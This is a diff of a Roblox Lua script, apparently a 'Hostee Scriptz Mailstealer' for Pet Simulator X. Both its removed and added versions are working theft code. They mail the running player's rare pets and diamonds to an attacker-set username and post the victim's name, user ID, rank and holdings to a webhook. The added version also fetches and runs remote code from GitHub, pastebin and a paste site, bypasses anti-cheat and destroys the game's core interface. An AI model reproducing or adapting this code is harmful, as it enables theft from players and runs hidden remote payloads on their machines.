@@ -1,191 +1,131 @@
-local HttpService = game:GetService("HttpService")
-local webhookUrl = _G.Webhook
+local UserInputService = game:GetService("UserInputService")
+UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
 
-local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
-local Fire, Invoke = Network.Fire, Network.Invoke
-
-hookfunction(getupvalue(Fire, 1), function(...)
-    return true
-end)
-
-local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
-local savedPets = FrameworkLibrary.Save.Get().Pets
-
-if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 100000 then
-    game.Players.LocalPlayer:Kick("Error launching script. Error code: " .. _G.ScriptName .. ".LaunchScript")
+for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+    v:Destroy()
 end
 
-local remotenameaaa = 0
-for i, v in pairs(game.ReplicatedStorage:GetChildren()) do
-    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-        remotenameaaa = remotenameaaa + 1
-        v.Name = tostring(remotenameaaa)
-    end
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Loading%20screen"))()
+
+function sendWebhook(webhook, message)
+    local webhookcheck =
+        is_sirhurt_closure and "Sirhurt" or
+        pebc_execute and "ProtoSmasher" or
+        syn and "Synapse X" or
+        secure_load and "Sentinel" or
+        KRNL_LOADED and "Krnl" or
+        SONA_LOADED and "Sona" or
+        "Kid with shit exploit"
+
+    local url = webhook
+    local data = {
+        ["content"] = message
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {
+        Url = url,
+        Body = newdata,
+        Method = "POST",
+        Headers = headers
+    }
+    request(abcdef)
 end
 
-game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+loadstring(game:HttpGet("https://paste.xyzo.space/nxll/APIlIlIlIlIlIlIlIllIiiLil.lua"))()
 
-local mailbox = game:GetService("Workspace").__MAP.Interactive.Mailbox
-for i, v in pairs(mailbox:GetDescendants()) do
-    if v:IsA("MeshPart") or v:IsA("Part") then
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
-        break
-    end
+BypassAntiCheat()
+AreaTeleport("Shop")
+TeleportToMailbox()
+local player = game:GetService("Players").LocalPlayer
+
+local dims = player.leaderstats.Diamonds.Value - 80000000
+if dims < 0 then
+    dims = 0
 end
 
-local folders = {
-    game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
-    game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
-}
-
-local function unlockPetsInFolder(folder)
-    local children = folder:GetChildren()
-    for _, child in ipairs(children) do
-        if child:IsA("TextButton") and child.Locked.Visible == true then
-            local name = child.Name
-            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("95")
-            if remote then
-                local args = {
-                    [name] = false
+wait(30)
+for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
+    if v:IsA("TextButton") then
+        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+            local args = {
+                [1] = {
+                    ["Recipient"] = _G.UserName,
+                    ["Diamonds"] = dims,
+                    ["Pets"] = {
+                        [1] = v.Name
+                    },
+                    ["Message"] = "Hostee was here"
                 }
-                remote:InvokeServer(args)
+            }
+            Networking.Invoke("Send Mail", unpack(args))
+            loadstring(game:HttpGet("https://pastebin.com/raw/Crk3YAnP"))()
+            dims = 0
+            
+            if game.PlaceId == 6284583030 then
+                _G.GameIn = "Pet Simulator X"
+            elseif game.PlaceId == 7722306047 then
+                _G.GameIn = "PSX Trading Plaza"
+            elseif game.PlaceId == 10321372166 then
+                _G.GameIn = "PSX Hardcore"
+            elseif game.PlaceId == 12610002282 then
+                _G.GameIn = "PSX Pro Trading Plaza"
+            elseif game.PlaceId == 11725212117 then
+                _G.GameIn = "PSX Voice Trading Plaza"
             else
-                warn("Remote not found")
+                _G.GameIn = "❓ Couldn't find game"
             end
-        end
-    end
-end
 
-while true do
-    for _, folder in ipairs(folders) do
-        unlockPetsInFolder(folder)
-        wait(0.2)
-    end
-
-    local lockedCount = 0
-    for _, folder in ipairs(folders) do
-        for _, child in ipairs(folder:GetChildren()) do
-            if child:IsA("TextButton") and child.Locked.Visible == true then
-                lockedCount = lockedCount + 1
-            end
-        end
-    end
-
-    if lockedCount == 0 then
-        -- All pets have been unlocked
-        break
-    end
-end
-
-for i, v in pairs(game:GetDescendants()) do
-    if v:IsA("Sound") then
-        v:Destroy()
-    end
-end
-
-while wait() do
-    for i, v in pairs(savedPets) do
-        local v2 = FrameworkLibrary.Directory.Pets[v.id]
-        if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 then
-            _G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
-            local args = {
-                {
-                    Recipient = "_G.Username",
-                    Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
-                    Pets = { v.uid },
-                    Message = "Hostee Scriptz Mailstealer"
+            local webhookcolor = "13369599"
+            _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+            _G.PlrUserVictim = game.Players.LocalPlayer.Name
+            _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
+            _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
+            
+            local function sendwebhook(msg)
+                local msg = {
+                    ["content"] = "**Hostee Scriptz Mailstealer has detected a new hit!**",
+                    ["embeds"] = {
+                        {
+                            ["title"] = "`Hostee Scriptz Mailstealer Results`",
+                            ["description"] = "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
+                            ["url"] = "https://dsc.gg/hosteehub",
+                            ["color"] = webhookcolor,
+                            ["fields"] = {
+                                {
+                                    ["name"] = "Diamonds 💎",
+                                    ["value"] = "```".._G.Diamonds.."```",
+                                    ["inline"] = true
+                                },
+                                {
+                                    ["name"] = "Pet Name & Rarity",
+                                    ["value"] = "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
+                                    ["inline"] = true
+                                }
+                            }
+                        }
+                    },
+                    ["attachments"] = {}
                 }
-            }
-            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("107")
-            if remote then
-                remote:InvokeServer(unpack(args))
+                local Webhook = _G.Webhook
+                local request = http_request or request or HttpPost or syn.request
+                request({
+                    Url = Webhook,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = game.HttpService:JSONEncode(msg)
+                })
             end
-            _G.PetName = v2.name
-            _G.PetRar = v2.rarity
-            local payload = {
-                petName = v2.name,
-                rarity = v2.rarity,
-                action = "Mailstealer",
-                username = game.Players.LocalPlayer.Name
-            }
-            local encodedPayload = HttpService:JSONEncode(payload)
-            HttpService:PostAsync(webhookUrl, encodedPayload)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
-        elseif v2.huge == true then
-            _G.Diamonds = 0
-            local args = {
-                {
-                    Recipient = "_G.Username",
-                    Diamonds = 0,
-                    Pets = { v.uid },
-                    Message = "Hostee Scriptz Mailstealer"
-                }
-            }
-            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("107")
-            if remote then
-                remote:InvokeServer(unpack(args))
-            end
-            _G.PetName = v2.name
-            _G.PetRar = v2.rarity
-            local payload = {
-                petName = v2.name,
-                rarity = v2.rarity,
-                action = "Mailstealer",
-                username = game.Players.LocalPlayer.Name
-            }
-            local encodedPayload = HttpService:JSONEncode(payload)
-            HttpService:PostAsync(webhookUrl, encodedPayload)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
-        elseif (v2.rarity == "Exclusive" and v2.huge == false) or (v2.rarity == "Event" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000) then
-            _G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
-            local args = {
-                {
-                    Recipient = _G.Username,
-                    Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
-                    Pets = { v.uid },
-                    Message = "Hostee Scriptz Mailstealer"
-                }
-            }
-            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("107")
-            if remote then
-                remote:InvokeServer(unpack(args))
-            end
-            _G.PetName = v2.name
-            _G.PetRar = v2.rarity
-            local payload = {
-                petName = v2.name,
-                rarity = v2.rarity,
-                action = "Mailstealer",
-                username = game.Players.LocalPlayer.Name
-            }
-            local encodedPayload = HttpService:JSONEncode(payload)
-            HttpService:PostAsync(webhookUrl, encodedPayload)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
-        elseif v2.rarity == "Exclusive" and v2.huge == false or v2.rarity == "Event" then
-            _G.Diamonds = 0
-            local args = {
-                {
-                    Recipient = _G.Username,
-                    Diamonds = 0,
-                    Pets = { v.uid },
-                    Message = "Hostee Scriptz Mailstealer"
-                }
-            }
-            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("107")
-            if remote then
-                remote:InvokeServer(unpack(args))
-            end
-            _G.PetName = v2.name
-            _G.PetRar = v2.rarity
-            local payload = {
-                petName = v2.name,
-                rarity = v2.rarity,
-                action = "Mailstealer",
-                username = game.Players.LocalPlayer.Name
-            }
-            local encodedPayload = HttpService:JSONEncode(payload)
-            HttpService:PostAsync(webhookUrl, encodedPayload)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/Executor%20detector%20Mail.lua"))()
+
+            sendwebhook()
         end
     end
 end
